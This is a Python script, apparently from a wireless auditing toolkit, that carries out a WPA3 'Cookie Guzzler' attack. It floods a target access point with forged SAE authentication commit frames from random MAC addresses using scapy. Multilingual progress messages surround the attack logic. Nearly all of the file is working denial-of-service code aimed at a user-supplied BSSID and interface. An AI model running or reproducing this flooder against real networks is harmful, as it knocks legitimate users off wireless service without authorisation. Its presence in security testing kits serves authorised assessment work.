#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys
from scapy.all import sendp, Dot11, RadioTap, Dot11Auth, RandMAC

GROUP_ID_BYTES = b"\x13\x00"
arr = {}

def language_strings():
	pot = "\033[36mPoT\033[0m "
	global arr
	arr = {
		("ENGLISH", 0): "Initializing Cookie Guzzler attack...",
		("SPANISH", 0): "Inicializando el ataque Cookie Guzzler...",
		("FRENCH", 0): "Initialisation de l'attaque Cookie Guzzler...",
		("CATALAN", 0): "Inicialitzant l'atac Cookie Guzzler...",
		("PORTUGUESE", 0): "Iniciando o ataque Cookie Guzzler...",
		("RUSSIAN", 0): "Инициализация атаки Cookie Guzzler...",
		("GREEK", 0): "Αρχικοποίηση επίθεσης Cookie Guzzler...",
		("ITALIAN", 0): "Inizializzando l'attacco Cookie Guzzler...",
		("POLISH", 0): "Inicjalizacja ataku Cookie Guzzler...",
		("GERMAN", 0): "Initialisierung des Cookie-Guzzler-Angriffs...",
		("TURKISH", 0): "Cookie Guzzler saldırısı hazırlanıyor...",
		("ARABIC", 0): "...Cookie Guzzler بدء تهيئة هجوم",
		("CHINESE", 0): "正在初始化 Cookie Guzzler 攻击...",

		("ENGLISH", 1): "Launching WPA3 Cookie Guzzler attack",
		("SPANISH", 1): "Lanzando ataque Cookie Guzzler WPA3",
		("FRENCH", 1): "Lancement de l'attaque WPA3 Cookie Guzzler",
		("CATALAN", 1): "Llançant l'atac WPA3 Cookie Guzzler",
		("PORTUGUESE", 1): "Iniciando o ataque WPA3 Cookie Guzzler",
		("RUSSIAN", 1): "Запуск атаки WPA3 Cookie Guzzler",
		("GREEK", 1): "Εκκίνηση επίθεσης WPA3 Cookie Guzzler",
		("ITALIAN", 1): "Avviando l'attacco WPA3 Cookie Guzzler",
		("POLISH", 1): "Uruchamianie ataku WPA3 Cookie Guzzler",
		("GERMAN", 1): "Starte WPA3 Cookie-Guzzler-Angriff",
		("TURKISH", 1): "WPA3 Cookie Guzzler saldırısı başlatılıyor",
		("ARABIC", 1): "WPA3 Cookie Guzzler بدء هجوم",
		("CHINESE", 1): "启动 WPA3 Cookie Guzzler 攻击",

		("ENGLISH", 2): "Target: {bssid} on frequency {freq} MHz (channel {channel}/band {band})",
		("SPANISH",2): "Objetivo: {bssid} en frecuencia {freq} MHz (canal {channel}/banda {band})",
		("FRENCH",2): f"{pot}Cible: {{bssid}} sur la fréquence {{freq}} MHz (canal {{channel}}/bande {{band}})",
		("CATALAN",2): f"{pot}Objectiu: {{bssid}} a la freqüència {{freq}} MHz (canal {{channel}}/banda {{band}})",
		("PORTUGUESE",2): f"{pot}Alvo: {{bssid}} na frequência {{freq}} MHz (canal {{channel}}/banda {{band}})",
		("RUSSIAN",2): f"{pot}Цель: {{bssid}} на частоте {{freq}} MHz (канал {{channel}}/диапазон {{band}})",
		("GREEK",2): f"{pot}Στόχος: {{bssid}} στη συχνότητα {{freq}} MHz (κανάλι {{channel}}/ζώνη {{band}})",
		("ITALIAN",2): f"{pot}Target: {{bssid}} sulla frequenza {{freq}} MHz (canale {{channel}}/banda {{band}})",
		("POLISH",2): f"{pot}Cel: {{bssid}} na częstotliwości {{freq}} MHz (kanał {{channel}}/pasmo {{band}})",
		("GERMAN",2): f"{pot}Ziel: {{bssid}} auf Frequenz {{freq}} MHz (Kanal {{channel}}/Band {{band}})",
		("TURKISH",2): f"{pot}Hedef: {{bssid}} {{freq}} MHz frekansında (kanal {{channel}}/bant {{band}})",
		("ARABIC",2): f"{pot}(النطاق {{band}}/القناة {{channel}}) بتردد {{freq}} MHz على {{bssid}} :الهدف",
		("CHINESE",2): f"{pot}目标: {{bssid}} 在频率 {{freq}} MHz（信道 {{channel}}/频段 {{band}}）",

		("ENGLISH", 3): "Starting Cookie Guzzler flood on {interface}...",
		("SPANISH", 3): "Iniciando flood Cookie Guzzler en {interface}...",
		("FRENCH", 3): "Démarrage du flood Cookie Guzzler sur {interface}...",
		("CATALAN", 3): "Iniciant flood Cookie Guzzler a {interface}...",
		("PORTUGUESE", 3): "Iniciando flood Cookie Guzzler em {interface}...",
		("RUSSIAN", 3): "Запуск флуд атаки Cookie Guzzler на {interface}...",
		("GREEK", 3): "Έναρξη flood Cookie Guzzler στο {interface}...",
		("ITALIAN", 3): "Iniziando flood Cookie Guzzler su {interface}...",
		("POLISH", 3): "Rozpoczynanie Cookie Guzzler flood na {interface}...",
		("GERMAN", 3): "Starte Cookie Guzzler Flood auf {interface}...",
		("TURKISH", 3): "{interface} üzerinde Cookie Guzzler flood başlatılıyor...",
		("ARABIC", 3): "...{interface} على Cookie Guzzler بدء فيضان",
		("CHINESE", 3): "在 {interface} 上启动 Cookie Guzzler 攻击...",

		("ENGLISH", 4): "Sent {count} frames...",
		("SPANISH", 4): "Enviados {count} frames...",
		("FRENCH", 4): "{count} trames envoyées...",
		("CATALAN", 4): "Enviats {count} frames...",
		("PORTUGUESE", 4): "{count} frames enviados...",
		("RUSSIAN", 4): "Отправлено кадров: {count}...",
		("GREEK", 4): "Εστάλησαν {count} frames...",
		("ITALIAN", 4): "Inviati {count} frame...",
		("POLISH", 4): "Wysłano {count} ramek (frames)...",
		("GERMAN", 4): "{count} Frames gesendet...",
		("TURKISH", 4): "{count} çerçeve gönderildi...",
		("ARABIC", 4): "...إطارات {count} أُرسلت",
		("CHINESE", 4): "当前已发送 {count} 帧...",
	}

def get_message(language, key, **kwargs):
	return arr.get((language, key), arr.get(("ENGLISH", key), "")).format(**kwargs)

def parse_args(argv):
	if len(argv) < 8:
		sys.exit("Usage: wpa3_cookie_guzzler.py <bssid> <freq> <channel> <band> <interface> <language> <scalar_hex> <finite_field_element_hex>")
	return {
		"bssid": argv[0],
		"freq": argv[1],
		"channel": argv[2],
		"band": argv[3],
		"interface": argv[4],
		"language": argv[5],
		"scalar": bytes.fromhex(argv[6]),
		"finite_field_element": bytes.fromhex(argv[7]),
	}

def build_payload(scalar_bytes, finite_bytes):
	return GROUP_ID_BYTES + scalar_bytes + finite_bytes

def main():
	sys.stdout.reconfigure(line_buffering=True, write_through=True)
	use_cr = sys.stdout.isatty()
	args = parse_args(sys.argv[1:])
	language_strings()
	print(get_message(args["language"], 0), flush=True)
	payload = build_payload(args["scalar"], args["finite_field_element"])

	print()
	print(get_message(args["language"], 1), flush=True)
	print(get_message(args["language"], 2, bssid=args["bssid"], freq=args["freq"], channel=args["channel"], band=args["band"]), flush=True)
	print(get_message(args["language"], 3, interface=args["interface"]), flush=True)
	print()

	counter = 0
	next_log = 2000
	progress_printed = False
	try:
		while True:
			src_mac = str(RandMAC())

			dot11 = Dot11(type=0, subtype=11, addr1=args["bssid"], addr2=src_mac, addr3=args["bssid"])
			auth = Dot11Auth(algo=3, seqnum=1, status=0)
			packet = RadioTap()/dot11/auth/payload

			sendp(packet, count=128, inter=0.0001, iface=args["interface"], verbose=0)

			counter += 128
			if counter >= next_log:
				msg = get_message(args["language"], 4, count=counter)
				if use_cr:
					sys.stdout.write(f"\r{msg}\x1b[K")
					sys.stdout.flush()
				else:
					if progress_printed:
						sys.stdout.write("\033[F")
					sys.stdout.write(f"{msg}\x1b[K\n")
					sys.stdout.flush()
					progress_printed = True
				next_log += 2000
	except KeyboardInterrupt:
		pass

if __name__ == "__main__":
	main()
